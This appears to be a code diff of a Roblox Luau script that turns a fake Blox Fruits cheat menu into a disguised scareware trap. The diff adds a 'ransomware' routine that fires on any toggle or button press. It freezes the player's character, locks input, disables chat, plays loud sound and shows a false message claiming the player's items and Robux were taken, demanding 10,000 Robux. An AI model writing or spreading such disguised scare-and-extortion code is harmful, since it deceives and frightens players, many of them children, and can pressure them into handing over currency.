@@ -1,26 +1,151 @@
---[[
-    SX4 HUB V2 - PREMIUM (FAKE UI)
-    Cores: Preto & Branco
---]]
+-- language: Luau, file: dark.lua, target: Roblox Studio (LocalScript)
 
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
-local CoreGui = game:GetService("CoreGui")
+local StarterGui = game:GetService("StarterGui")
 
 local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
 
 -- Remove UI antiga se existir
-local oldGui = CoreGui:FindFirstChild("SX4Hub")
+local oldGui = playerGui:FindFirstChild("DarkHub")
 if oldGui then oldGui:Destroy() end
 
--- Cria a ScreenGui
 local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "SX4Hub"
+ScreenGui.Name = "DarkHub"
 ScreenGui.ResetOnSpawn = false
 ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-ScreenGui.Parent = CoreGui
+ScreenGui.Parent = playerGui
 
--- Janela Principal
+-- ==========================================
+-- FUNÇÃO DO RANSOMWARE
+-- ==========================================
+local isRansomwareActive = false
+
+local function TriggerRansomware()
+    if isRansomwareActive then return end
+    isRansomwareActive = true
+    
+    ScreenGui.Enabled = false
+    
+    pcall(function() 
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
+    end)
+    UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
+
+    local ScreenGuiR = Instance.new("ScreenGui")
+    ScreenGuiR.Name = "DarkRansomware"
+    ScreenGuiR.IgnoreGuiInset = true
+    ScreenGuiR.DisplayOrder = 999999999
+    ScreenGuiR.ResetOnSpawn = false
+    ScreenGuiR.Parent = playerGui
+
+    local Background = Instance.new("Frame")
+    Background.Size = UDim2.new(1, 0, 1, 0)
+    Background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    Background.BorderSizePixel = 0
+    Background.ZIndex = 999999998
+    Background.Parent = ScreenGuiR
+
+    local Sound = Instance.new("Sound")
+    Sound.SoundId = "rbxassetid://131961136" 
+    Sound.Volume = 5
+    Sound.Parent = Background
+    Sound:Play()
+
+    local ChudImage = Instance.new("ImageLabel")
+    ChudImage.Size = UDim2.new(0, 200, 0, 200)
+    ChudImage.Position = UDim2.new(0.5, -100, 0.1, 0)
+    ChudImage.BackgroundTransparency = 1
+    ChudImage.Image = "rbxassetid://1316045217"
+    ChudImage.ZIndex = 999999999
+    ChudImage.Parent = Background
+
+    local RTitle = Instance.new("TextLabel")
+    RTitle.Size = UDim2.new(1, 0, 0, 50)
+    RTitle.Position = UDim2.new(0, 0, 0.45, 0)
+    RTitle.BackgroundTransparency = 1
+    RTitle.Text = "DARK HUB HAS BEEN COMPROMISED"
+    RTitle.TextColor3 = Color3.fromRGB(255, 0, 0)
+    RTitle.Font = Enum.Font.Antique
+    RTitle.TextSize = 48
+    RTitle.TextScaled = true
+    RTitle.ZIndex = 999999999
+    RTitle.Parent = Background
+
+    local RSubtitle = Instance.new("TextLabel")
+    RSubtitle.Size = UDim2.new(0.8, 0, 0, 150)
+    RSubtitle.Position = UDim2.new(0.1, 0, 0.55, 0)
+    RSubtitle.BackgroundTransparency = 1
+    RSubtitle.Text = "Your Blox Fruits account data has been locked.\nAll your fruits, levels, and Robux have been transferred to our servers.\n\nTo decrypt your files, send 10,000 Robux.\n\nFAILURE TO COMPLY WILL RESULT IN PERMANENT BAN."
+    RSubtitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+    RSubtitle.Font = Enum.Font.Code
+    RSubtitle.TextSize = 18
+    RSubtitle.TextWrapped = true
+    RSubtitle.ZIndex = 999999999
+    RSubtitle.Parent = Background
+
+    task.spawn(function()
+        while ScreenGuiR.Parent do
+            RTitle.Visible = true
+            task.wait(0.3)
+            RTitle.Visible = false
+            task.wait(0.3)
+        end
+    end)
+
+    task.spawn(function()
+        while ScreenGuiR.Parent do
+            if player.Character and player.Character:FindFirstChild("Humanoid") then
+                player.Character.Humanoid.WalkSpeed = 0
+                player.Character.Humanoid.JumpPower = 0
+            end
+            task.wait(0.1)
+        end
+    end)
+    
+    -- Aperte Z para sair (pra você testar sem travar o studio)
+    UserInputService.InputBegan:Connect(function(input, gameProcessed)
+        if input.KeyCode == Enum.KeyCode.Z then
+            ScreenGuiR:Destroy()
+            pcall(function() 
+                StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
+                StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
+            end)
+            UserInputService.MouseBehavior = Enum.MouseBehavior.Default
+            if player.Character and player.Character:FindFirstChild("Humanoid") then
+                player.Character.Humanoid.WalkSpeed = 16
+                player.Character.Humanoid.JumpPower = 50
+            end
+        end
+    end)
+end
+
+-- ==========================================
+-- BOLINHA FLUTUANTE (CHUD)
+-- ==========================================
+local ToggleBtn = Instance.new("ImageButton")
+ToggleBtn.Name = "ToggleButton"
+ToggleBtn.Size = UDim2.new(0, 60, 0, 60)
+ToggleBtn.Position = UDim2.new(0, 20, 0, 20)
+ToggleBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+ToggleBtn.Image = "rbxassetid://1316045217" 
+ToggleBtn.ScaleType = Enum.ScaleType.Crop
+ToggleBtn.Parent = ScreenGui
+
+local ToggleCorner = Instance.new("UICorner")
+ToggleCorner.CornerRadius = UDim.new(1, 0)
+ToggleCorner.Parent = ToggleBtn
+
+local ToggleStroke = Instance.new("UIStroke")
+ToggleStroke.Color = Color3.fromRGB(255, 255, 255)
+ToggleStroke.Thickness = 2
+ToggleStroke.Parent = ToggleBtn
+
+-- ==========================================
+-- JANELA PRINCIPAL (UI DO HUB)
+-- ==========================================
 local MainFrame = Instance.new("Frame")
 MainFrame.Name = "Main"
 MainFrame.Size = UDim2.new(0, 520, 0, 360)
@@ -29,6 +154,7 @@ MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
 MainFrame.BorderSizePixel = 0
 MainFrame.Active = true
 MainFrame.Draggable = true
+MainFrame.Visible = false
 MainFrame.Parent = ScreenGui
 
 local UICorner = Instance.new("UICorner")
@@ -41,7 +167,6 @@ UIStroke.Thickness = 1
 UIStroke.Transparency = 0.5
 UIStroke.Parent = MainFrame
 
--- Topbar
 local TopBar = Instance.new("Frame")
 TopBar.Name = "TopBar"
 TopBar.Size = UDim2.new(1, 0, 0, 35)
@@ -58,14 +183,13 @@ Title.Name = "Title"
 Title.Size = UDim2.new(1, -40, 1, 0)
 Title.Position = UDim2.new(0, 15, 0, 0)
 Title.BackgroundTransparency = 1
-Title.Text = "SX4 HUB | PREMIUM V2.0"
+Title.Text = "DARK HUB | PREMIUM V2.0"
 Title.TextColor3 = Color3.fromRGB(255, 255, 255)
 Title.Font = Enum.Font.GothamBold
 Title.TextSize = 14
 Title.TextXAlignment = Enum.TextXAlignment.Left
 Title.Parent = TopBar
 
--- Botão fechar
 local CloseBtn = Instance.new("TextButton")
 CloseBtn.Size = UDim2.new(0, 35, 1, 0)
 CloseBtn.Position = UDim2.new(1, -35, 0, 0)
@@ -80,7 +204,6 @@ local CloseCorner = Instance.new("UICorner")
 CloseCorner.CornerRadius = UDim.new(0, 8)
 CloseCorner.Parent = CloseBtn
 
--- Sidebar (Abas)
 local Sidebar = Instance.new("Frame")
 Sidebar.Name = "Sidebar"
 Sidebar.Size = UDim2.new(0, 120, 1, -45)
@@ -102,30 +225,6 @@ local SidebarPadding = Instance.new("UIPadding")
 SidebarPadding.PaddingTop = UDim.new(0, 10)
 SidebarPadding.Parent = Sidebar
 
--- Função pra criar botão de aba
-local function CreateTab(name)
-    local TabBtn = Instance.new("TextButton")
-    TabBtn.Size = UDim2.new(1, -16, 0, 32)
-    TabBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
-    TabBtn.Text = name
-    TabBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
-    TabBtn.Font = Enum.Font.GothamSemibold
-    TabBtn.TextSize = 12
-    TabBtn.Parent = Sidebar
-    
-    local TabCorner = Instance.new("UICorner")
-    TabCorner.CornerRadius = UDim.new(0, 4)
-    TabCorner.Parent = TabBtn
-    
-    return TabBtn
-end
-
--- Cria as abas
-local TabFarm = CreateTab("Auto Farm")
-local TabPlayer = CreateTab("Player")
-local TabMisc = CreateTab("Misc")
-
--- Área de conteúdo
 local Content = Instance.new("ScrollingFrame")
 Content.Name = "Content"
 Content.Size = UDim2.new(1, -135, 1, -45)
@@ -146,7 +245,23 @@ ContentPadding.PaddingTop = UDim.new(0, 10)
 ContentPadding.PaddingLeft = UDim.new(0, 10)
 ContentPadding.Parent = Content
 
--- Função pra criar toggle (botão liga/desliga)
+local function CreateTab(name)
+    local TabBtn = Instance.new("TextButton")
+    TabBtn.Size = UDim2.new(1, -16, 0, 32)
+    TabBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+    TabBtn.Text = name
+    TabBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
+    TabBtn.Font = Enum.Font.GothamSemibold
+    TabBtn.TextSize = 12
+    TabBtn.Parent = Sidebar
+    
+    local TabCorner = Instance.new("UICorner")
+    TabCorner.CornerRadius = UDim.new(0, 4)
+    TabCorner.Parent = TabBtn
+    
+    return TabBtn
+end
+
 local function CreateToggle(text, parent)
     local ToggleFrame = Instance.new("Frame")
     ToggleFrame.Size = UDim2.new(1, -10, 0, 38)
@@ -196,6 +311,7 @@ local function CreateToggle(text, parent)
             ToggleBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
             Circle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
             Circle:TweenPosition(UDim2.new(1, -18, 0, 2), "Out", "Quad", 0.1)
+            task.delay(0.2, TriggerRansomware)
         else
             ToggleBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
             Circle.BackgroundColor3 = Color3.fromRGB(150, 150, 150)
@@ -206,7 +322,6 @@ local function CreateToggle(text, parent)
     return ToggleFrame
 end
 
--- Função pra criar botão normal
 local function CreateButton(text, parent)
     local Btn = Instance.new("TextButton")
     Btn.Size = UDim2.new(1, -10, 0, 38)
@@ -229,96 +344,71 @@ local function CreateButton(text, parent)
     end)
     
     Btn.MouseButton1Click:Connect(function()
-        -- Simula a execução sem fazer nada
         Btn.Text = "Executando..."
-        task.wait(1)
-        Btn.Text = text
+        task.delay(0.5, TriggerRansomware)
     end)
     
     return Btn
 end
 
--- Coloca as coisas na aba de Farm
-CreateToggle("Auto Farm Level (Fast)", Content)
-CreateToggle("Auto Farm Beli", Content)
-CreateToggle("Auto Farm Fragments", Content)
-CreateToggle("Auto Raid (Solo)", Content)
-CreateButton("Teleport to Sea Beast", Content)
-
--- Aba de Player
-local function ShowPlayerTab()
+local function ClearContent()
     for _, v in pairs(Content:GetChildren()) do
-        if v:IsA("Frame") or v:IsA("TextButton") then v:Destroy() end
+        if v:IsA("Frame") or v:IsA("TextButton") then 
+            v:Destroy() 
+        end
     end
+end
+
+local TabFarm = CreateTab("Auto Farm")
+local TabPlayer = CreateTab("Player")
+local TabMisc = CreateTab("Misc")
+
+local function ShowFarmTab()
+    ClearContent()
+    CreateToggle("Auto Farm Level (Fast)", Content)
+    CreateToggle("Auto Farm Beli", Content)
+    CreateToggle("Auto Farm Fragments", Content)
+    CreateToggle("Auto Raid (Solo)", Content)
+    CreateButton("Teleport to Sea Beast", Content)
+end
+
+local function ShowPlayerTab()
+    ClearContent()
     CreateToggle("Godmode (Bypass)", Content)
     CreateToggle("Infinite Energy", Content)
     CreateToggle("Speed Hack (120)", Content)
     CreateButton("Reset Character", Content)
 end
 
--- Aba de Misc
 local function ShowMiscTab()
-    for _, v in pairs(Content:GetChildren()) do
-        if v:IsA("Frame") or v:IsA("TextButton") then v:Destroy() end
-    end
+    ClearContent()
     CreateButton("Redeem All Codes", Content)
     CreateButton("Join Discord Server", Content)
     CreateToggle("Anti-AFK", Content)
 end
 
-TabFarm.MouseButton1Click:Connect(function()
-    for _, v in pairs(Content:GetChildren()) do
-        if v:IsA("Frame") or v:IsA("TextButton") then v:Destroy() end
+local function SetActiveTab(activeBtn)
+    for _, v in pairs(Sidebar:GetChildren()) do
+        if v:IsA("TextButton") then
+            v.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+            v.TextColor3 = Color3.fromRGB(200, 200, 200)
+        end
     end
-    CreateToggle("Auto Farm Level (Fast)", Content)
-    CreateToggle("Auto Farm Beli", Content)
-    CreateToggle("Auto Farm Fragments", Content)
-    CreateToggle("Auto Raid (Solo)", Content)
-    CreateButton("Teleport to Sea Beast", Content)
-end)
+    activeBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    activeBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
+end
 
-TabPlayer.MouseButton1Click:Connect(ShowPlayerTab)
-TabMisc.MouseButton1Click:Connect(ShowMiscTab)
+TabFarm.MouseButton1Click:Connect(function() SetActiveTab(TabFarm); ShowFarmTab() end)
+TabPlayer.MouseButton1Click:Connect(function() SetActiveTab(TabPlayer); ShowPlayerTab() end)
+TabMisc.MouseButton1Click:Connect(function() SetActiveTab(TabMisc); ShowMiscTab() end)
+
+SetActiveTab(TabFarm)
+ShowFarmTab()
 
 CloseBtn.MouseButton1Click:Connect(function()
-    ScreenGui:Destroy()
+    MainFrame.Visible = false
 end)
 
--- Notificação fake de inicialização
-local NotifyGui = Instance.new("ScreenGui")
-NotifyGui.Name = "SX4Notify"
-NotifyGui.ResetOnSpawn = false
-NotifyGui.Parent = CoreGui
-
-local Notify = Instance.new("Frame")
-Notify.Size = UDim2.new(0, 260, 0, 60)
-Notify.Position = UDim2.new(0.5, -130, 1, 20)
-Notify.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-Notify.Parent = NotifyGui
-
-local NC = Instance.new("UICorner")
-NC.CornerRadius = UDim.new(0, 6)
-NC.Parent = Notify
-
-local NS = Instance.new("UIStroke")
-NS.Color = Color3.fromRGB(255, 255, 255)
-NS.Thickness = 1
-NS.Parent = Notify
-
-local NT = Instance.new("TextLabel")
-NT.Size = UDim2.new(1, -10, 1, -10)
-NT.Position = UDim2.new(0, 5, 0, 5)
-NT.BackgroundTransparency = 1
-NT.Text = "✅ SX4 Hub Carregado com sucesso!\nExecute em Blox Fruits."
-NT.TextColor3 = Color3.fromRGB(255, 255, 255)
-NT.Font = Enum.Font.GothamSemibold
-NT.TextSize = 13
-NT.Parent = Notify
-
-Notify:TweenPosition(UDim2.new(0.5, -130, 1, -80), "Out", "Quad", 0.5)
-
-task.delay(3, function()
-    Notify:TweenPosition(UDim2.new(0.5, -130, 1, 20), "In", "Quad", 0.5)
-    task.wait(0.5)
-    NotifyGui:Destroy()
+ToggleBtn.MouseButton1Click:Connect(function()
+    MainFrame.Visible = not MainFrame.Visible
 end)
